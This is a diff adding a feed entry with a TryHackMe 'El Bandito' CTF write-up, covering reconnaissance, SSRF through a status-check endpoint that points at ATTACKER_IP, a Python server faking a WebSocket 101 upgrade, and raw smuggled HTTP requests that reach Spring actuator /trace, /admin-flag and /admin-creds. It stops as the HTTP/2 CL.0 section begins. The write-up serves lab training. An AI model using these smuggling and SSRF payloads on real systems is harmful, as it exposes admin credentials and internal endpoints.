@@ -2,9 +2,371 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
   <title>writeups on aviskase</title>
   <id>https://www.aviskase.com/</id>
-  <updated>2025-03-05T16:35:52Z</updated>
+  <updated>2025-03-13T21:08:05Z</updated>
   <link rel="self" type="application/atom+xml" href="https://www.aviskase.com/categories/writeups/feeds/all.atom.xml" hreflang="en"/>
   <link rel="alternate" type="text/html" href="https://www.aviskase.com/categories/writeups/" hreflang="en"/>
+  <entry>
+    <title>Writeup: TryHackMe El Bandito</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/03/13/writeup-tryhackme-el-bandito/" hreflang="en"/>
+    <published>2025-03-13T21:08:05Z</published>
+    <updated>2025-03-13T21:08:05Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-03-13:/articles/2025/03/13/writeup-tryhackme-el-bandito/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/room/elbandito" class="external-link">El Bandito</a></li>
+<li>Difficulty: hard</li>
+<li>Platform: web</li>
+</ul>
+<p>El Bandito, the new identity of the infamous Jack the Exploiter, has plunged into the Web3 domain with a devious token scam. By exploiting the decentralized essence of blockchain, he crafted and circulated fraudulent tokens, deceiving investors and shaking the foundational trust of the decentralized finance DeFi ecosystem.</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/room/elbandito" class="external-link">El Bandito</a></li>
+<li>Difficulty: hard</li>
+<li>Platform: web</li>
+</ul>
+<p>El Bandito, the new identity of the infamous Jack the Exploiter, has plunged into the Web3 domain with a devious token scam. By exploiting the decentralized essence of blockchain, he crafted and circulated fraudulent tokens, deceiving investors and shaking the foundational trust of the decentralized finance DeFi ecosystem.</p>
+<p>As we embark on this new challenge, it becomes clear that the stakes are higher than ever. To succeed, we must infiltrate his network, decode his strategies, and anticipate his moves before he can strike again.</p>
+<p>The mission has evolved: now, we must capture El Bandito. This requires a deep dive into the digital underworld, using cunning and technical skills to outmaneuver him and restore security.</p>
+<p>We request your help in smuggling all the flags.</p>
+<p>Answer the questions below</p>
+<ol>
+<li>Whats the first web flag?</li>
+<li>Whats the second web flag?</li>
+</ol>
+</div>
+<p>The room acts as a final step of HTTP smuggling module, so, explored vulnerabilities are not surprising:</p>
+<ul>
+<li>SSRF</li>
+<li>HTTP request smuggling via fake WebSocket tunnel</li>
+<li>HTTP request smuggling over HTTP 2 with CL.0 technique</li>
+</ul>
+<div class="callout toc">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a>
+      <ol>
+        <li><a href="#port-8080">Port 8080</a></li>
+        <li><a href="#port-80">Port 80</a></li>
+      </ol>
+    </li>
+    <li><a href="#establishing-a-fake-websocket-tunnel-via-ssrf">Establishing a fake WebSocket tunnel via SSRF</a></li>
+    <li><a href="#smuggling-http-request-to-get-the-first-flag">Smuggling HTTP request to get the first flag</a></li>
+    <li><a href="#http-2-cl0-desync-to-get-the-second-flag">HTTP 2 CL.0 desync to get the second flag</a></li>
+  </ol>
+</nav>
+</div>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>Port scan revealed two HTTP servers and a printing service (it is not used in this challenge).</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sV -vv -n -T4 10.10.146.124
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh      syn-ack ttl <span style="color:#fab387">61</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; pro
+</span></span><span style="display:flex;"><span>tocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  ssl/http syn-ack ttl <span style="color:#fab387">60</span> El Bandito Server
+</span></span><span style="display:flex;"><span>631/tcp  open  ipp      syn-ack ttl <span style="color:#fab387">61</span> CUPS 2.4
+</span></span><span style="display:flex;"><span>8080/tcp open  http     syn-ack ttl <span style="color:#fab387">60</span> nginx
+</span></span></code></pre></div><h3 id="port-8080" >
+  <a href="#port-8080">Port 8080</a>
+</h3>
+<p>On port 8080 there is a landing page for Bandit-Coin. Only two links work: &ldquo;Services&rdquo; and &ldquo;Burn Token&rdquo;.</p>
+<p><img src="ctf_elbandito_8080_home.png" alt="8080 app home page"></p>
+<p>&ldquo;Services&rdquo; page shows status of related services.</p>
+<p><img src="ctf_elbandito_8080_services.png" alt="Service page showing offline status for websocket service and online status for public service"></p>
+<p>Status is checked via simple <code>GET</code> requests with service URL as a parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>GET /isOnline?url=http://bandito.public.thm
+</span></span><span style="display:flex;"><span>GET /isOnline?url=http://bandito.websocket.thm
+</span></span></code></pre></div><p>&ldquo;Burn Token&rdquo; page has a feature that doesn&rsquo;t work because it relies on WebSocket service which is currently down. Console shows a message that the service isn&rsquo;t working <em>on purpose</em>.</p>
+<p><img src="ctf_elbandito_burn_ws_error.png" alt="Burn Token page and Console pane with error messages"></p>
+<p>Directories enumeration with <code>gobuster</code> shows several useful endpoints.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...SNIP...
+</span></span><span style="display:flex;"><span>/trace <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/autoconfig <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/metrics <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/home <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/lang <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/pwd <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/beans <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/language <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/dump <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span></code></pre></div><p>With these (and rerunning <code>nmap</code> with scripts) I concluded that this web app is running Spring Java framework.</p>
+<h3 id="port-80" >
+  <a href="#port-80">Port 80</a>
+</h3>
+<p>Second service must be accessed via HTTPS only and supports HTTP 2. Main page is linking to a JavaScript file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ curl -ksi  https://10.10.146.124:80 
+</span></span><span style="display:flex;"><span>HTTP/2 200 
+</span></span><span style="display:flex;"><span>date: Thu, 06 Mar 2025 21:42:47 GMT
+</span></span><span style="display:flex;"><span>content-type: text/html; charset=utf-8
+</span></span><span style="display:flex;"><span>content-length: 58
+</span></span><span style="display:flex;"><span>content-security-policy: default-src &#39;self&#39;; script-src &#39;self&#39;; object-src &#39;none&#39;;
+</span></span><span style="display:flex;"><span>x-content-type-options: nosniff
+</span></span><span style="display:flex;"><span>x-frame-options: SAMEORIGIN
+</span></span><span style="display:flex;"><span>x-xss-protection: 1; mode=block
+</span></span><span style="display:flex;"><span>feature-policy: microphone &#39;none&#39;; geolocation &#39;none&#39;;
+</span></span><span style="display:flex;"><span>age: 0
+</span></span><span style="display:flex;"><span>server: El Bandito Server
+</span></span><span style="display:flex;"><span>accept-ranges: bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nothing to see &lt;script src=&#39;/static/messages.js&#39;&gt;&lt;/script&gt;
+</span></span></code></pre></div><p>File <code>messages.js</code> shows chat functionality and two endpoints:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#89dceb">document</span>.addEventListener(<span style="color:#a6e3a1">&#34;DOMContentLoaded&#34;</span>, <span style="color:#f38ba8">function</span> () {
+</span></span><span style="display:flex;"><span>	...SNIP...
+</span></span><span style="display:flex;"><span>	<span style="color:#f38ba8">function</span> fetchMessages() {
+</span></span><span style="display:flex;"><span>		fetch(<span style="color:#a6e3a1">&#34;/getMessages&#34;</span>)
+</span></span><span style="display:flex;"><span>			...SNIP...
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	...SNIP...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6c7086;font-style:italic">// Function to send a message to the server
+</span></span></span><span style="display:flex;"><span><span style="color:#6c7086;font-style:italic"></span>	<span style="color:#f38ba8">function</span> sendMessage() {
+</span></span><span style="display:flex;"><span>		...SNIP...
+</span></span><span style="display:flex;"><span>			fetch(<span style="color:#a6e3a1">&#34;/send_message&#34;</span>, {
+</span></span><span style="display:flex;"><span>				...SNIP...
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	...SNIP...
+</span></span></code></pre></div><p>Going to <code>/getMessages</code> redirects to the login form.</p>
+<p><img src="ctf_elbandito_80_signin.png" alt="Login form"></p>
+<h2 id="establishing-a-fake-websocket-tunnel-via-ssrf" >
+  <a href="#establishing-a-fake-websocket-tunnel-via-ssrf">Establishing a fake WebSocket tunnel via SSRF</a>
+</h2>
+<p>Knowing that the room is about HTTP smuggling, I was confident that I needed to <a href="https://github.com/0ang3el/websocket-smuggle" class="external-link">establish a fake WebSocket tunnel</a>. First, we need to trick the server to think that WebSocket service responds with 101 code. For that, I confirmed SSRF vulnerability in the status check API:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl -ksi <span style="color:#a6e3a1">&#39;http://MACHINE_IP:8080/isOnline?url=http://ATTACKER_IP:8000&#39;</span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#fab387">200</span> 
+</span></span><span style="display:flex;"><span>Server: nginx
+</span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#fab387">06</span> Mar <span style="color:#fab387">2025</span> 21:57:55 GMT
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#fab387">0</span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span></code></pre></div><p>Then I wrote a simple python server which responds with 101 code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#94e2d5">from</span> <span style="color:#fab387">http.server</span> <span style="color:#94e2d5">import</span> HTTPServer, BaseHTTPRequestHandler
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">class</span> <span style="color:#f9e2af">ExploitHandler</span>(BaseHTTPRequestHandler):
+</span></span><span style="display:flex;"><span>    <span style="color:#cba6f7">def</span> <span style="color:#89b4fa">do_GET</span>(<span style="color:#89dceb">self</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>log_request()
+</span></span><span style="display:flex;"><span>        <span style="color:#cba6f7">if</span> <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>path <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#a6e3a1">&#39;/ws&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>protocol_version <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#a6e3a1">&#34;HTTP/1.1&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>send_response(<span style="color:#fab387">101</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>end_headers()
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">print</span>(<span style="color:#a6e3a1">&#34;websocket request&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#cba6f7">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">print</span>(<span style="color:#a6e3a1">&#34;other&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">def</span> <span style="color:#89b4fa">run_server</span>(port<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">8000</span>):
+</span></span><span style="display:flex;"><span>    server_address <span style="color:#89dceb;font-weight:bold">=</span> (<span style="color:#a6e3a1">&#39;&#39;</span>, port)
+</span></span><span style="display:flex;"><span>    httpd <span style="color:#89dceb;font-weight:bold">=</span> HTTPServer(server_address, ExploitHandler)
+</span></span><span style="display:flex;"><span>    <span style="color:#89dceb">print</span>(<span style="color:#f38ba8">f</span><span style="color:#a6e3a1">&#34;Server running on port </span><span style="color:#a6e3a1">{</span>port<span style="color:#a6e3a1">}</span><span style="color:#a6e3a1">&#34;</span>)
+</span></span><span style="display:flex;"><span>    httpd<span style="color:#89dceb;font-weight:bold">.</span>serve_forever()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">if</span> <span style="color:#f5e0dc">__name__</span> <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#a6e3a1">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    run_server()
+</span></span></code></pre></div><p>And to confirm successful request smuggling I crafted a request to non-existing page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /toto HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div><h2 id="smuggling-http-request-to-get-the-first-flag" >
+  <a href="#smuggling-http-request-to-get-the-first-flag">Smuggling HTTP request to get the first flag</a>
+</h2>
+<p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html" class="external-link">Spring web apps have several interesting endpoints</a>:</p>
+
+<blockquote>
+    <p>Certain Actuator endpoints can expose sensitive data or allow harmful actions:</p>
+<ul>
+<li><code>/dump</code>, <code>/trace</code>, <code>/logfile</code>, <code>/shutdown</code>, <code>/mappings</code>, <code>/env</code>, <code>/actuator/env</code>, <code>/restart</code>, and <code>/heapdump</code>.</li>
+</ul>
+</blockquote>
+<p>Smuggling request to <code>/trace</code> showed that there are two additional endpoints <code>/admin-creds</code> and <code>/admin-flag</code>.</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-1" id="tabs-1-0" checked="checked" />
+<label for="tabs-1-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /trace HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-1" id="tabs-1-1"  />
+<label for="tabs-1-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span> <span style="color:#fab387">101</span> 
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> nginx
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 21:10:50 GMT
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> upgrade
+</span></span><span style="display:flex;"><span>X-Application-Context<span style="color:#89dceb;font-weight:bold">:</span> application:8081
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span><span style="display:flex;"><span>Content-Type: application/json;charset=UTF-8
+</span></span><span style="display:flex;"><span>Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>Date: Fri, 07 Mar 2025 21:10:50 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>13bc
+</span></span><span style="display:flex;"><span>[{&#34;timestamp&#34;:1741381850617,&#34;info&#34;:{&#34;method&#34;:&#34;GET&#34;,&#34;path&#34;:&#34;/isOnline&#34;,&#34;headers&#34;:{&#34;request&#34;:{&#34;upgrade&#34;:&#34;WebSocket&#34;,&#34;connection&#34;:&#34;Upgrade&#34;,&#34;host&#34;:&#34;localhost:8002&#34;,&#34;sec-websocket-key&#34;:&#34;nf6dB8Pb/BLinZ7UexUXHg==&#34;,&#34;sec-websocket-version&#34;:&#34;13&#34;},&#34;response&#34;:{&#34;X-Application-Context&#34;:&#34;application:8081&#34;,&#34;Date&#34;:&#34;Fri, 07 Mar 2025 21:10:50 GMT&#34;,&#34;status&#34;:&#34;101&#34;}}}},{&#34;timestamp&#34;:1741381841023,&#34;info&#34;:{&#34;method&#34;:&#34;GET&#34;,&#34;path&#34;:&#34;/admin-creds&#34;,&#34;headers&#34;:{&#34;request&#34;:{&#34;host&#34;:&#34;0.0.0.0:8081&#34;,&#34;user-agent&#34;:&#34;Wget&#34;,&#34;connection&#34;:&#34;close&#34;},&#34;response&#34;:{&#34;X-Application-Context&#34;:&#34;application:8081&#34;,&#34;Content-Type&#34;:&#34;text/plain&#34;,&#34;Content-Length&#34;:&#34;55&#34;,&#34;Date&#34;:&#34;Fri, 07 Mar 2025 21:10:40 GMT&#34;,&#34;Connection&#34;:&#34;close&#34;,&#34;status&#34;:&#34;200&#34;}}}},{&#34;timestamp&#34;:1741381840973,&#34;info&#34;:{&#34;method&#34;:&#34;GET&#34;,&#34;path&#34;:&#34;/admin-flag&#34;,&#34;headers&#34;:{&#34;request&#34;:{&#34;host&#34;:&#34;0.0.0.0:8081&#34;,&#34;user-agent&#34;:&#34;Wget&#34;,&#34;connection&#34;:&#34;close&#34;},&#34;response&#34;:{&#34;X-Application-Context&#34;:&#34;application:8081&#34;,&#34;Content-Type&#34;:&#34;text/plain&#34;,&#34;Content-Length&#34;:&#34;43&#34;,&#34;Date&#34;:&#34;Fri, 07 Mar 2025 21:10:40 GMT&#34;,&#34;Connection&#34;:&#34;close&#34;,&#34;status&#34;:&#34;200&#34;}}}}, ...SNIP...]
+</span></span><span style="display:flex;"><span>0
+</span></span></code></pre></div></div>
+</div>
+<p>And smuggling request to <code>/admin-flag</code> reveals the first flag:</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-2" id="tabs-2-0" checked="checked" />
+<label for="tabs-2-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /admin-flag HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-2" id="tabs-2-1"  />
+<label for="tabs-2-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span> <span style="color:#fab387">101</span> 
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> nginx
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 21:16:46 GMT
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> upgrade
+</span></span><span style="display:flex;"><span>X-Application-Context<span style="color:#89dceb;font-weight:bold">:</span> application:8081
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>Content-Length: 43
+</span></span><span style="display:flex;"><span>Date: Fri, 07 Mar 2025 21:16:46 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>THM{:::REDACTED:::}
+</span></span></code></pre></div></div>
+</div>
+<h2 id="http-2-cl0-desync-to-get-the-second-flag" >
+  <a href="#http-2-cl0-desync-to-get-the-second-flag">HTTP 2 CL.0 desync to get the second flag</a>
+</h2>
+<p>Credentials from <code>/admin-creds</code> can be used to login into chat application:</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-3" id="tabs-3-0" checked="checked" />
+<label for="tabs-3-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /admin-creds HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-3" id="tabs-3-1"  />
+<label for="tabs-3-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span> <span style="color:#fab387">101</span> 
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> nginx
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 21:15:49 GMT
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> upgrade
+</span></span><span style="display:flex;"><span>X-Application-Context<span style="color:#89dceb;font-weight:bold">:</span> application:8081
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>Content-Length: 55
+</span></span><span style="display:flex;"><span>Date: Fri, 07 Mar 2025 21:15:49 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username:REDACTED password:REDACTED
+</span></span></code></pre></div></div>
+</div>
+<p><img src="ctf_elbandito_chat.png" alt="Chat page with several loaded messages"></p>
+<p>Having valid cookies I used <a href="https://github.com/PortSwigger/http-request-smuggler" class="external-link">HTTP Request Smuggler</a> Burp extension to confirm possibility of poisoning HTTP queue:</p>
